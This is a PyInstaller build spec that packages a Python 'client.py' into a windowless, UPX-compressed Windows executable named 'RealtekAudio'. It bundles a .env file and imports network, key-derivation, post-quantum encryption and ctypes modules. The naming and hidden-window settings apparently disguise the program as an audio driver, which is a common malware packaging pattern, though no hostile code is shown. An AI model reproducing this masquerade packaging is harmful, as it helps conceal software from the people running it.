# -*- mode: python ; coding: utf-8 -*-

import os
from PyInstaller.building.build_main import Analysis, PYZ, EXE

env_data = []
if os.path.exists('.env'):
    env_data.append(('.env', '.'))

a = Analysis(
    ['dist\\client.py'],
    pathex=[],
    binaries=[],
    datas=env_data,
    hiddenimports=['requests', 'cryptography.hazmat.primitives.kdf.hkdf', 'kyber_py.ml_kem', 'ctypes', 'dotenv'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='RealtekAudio',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
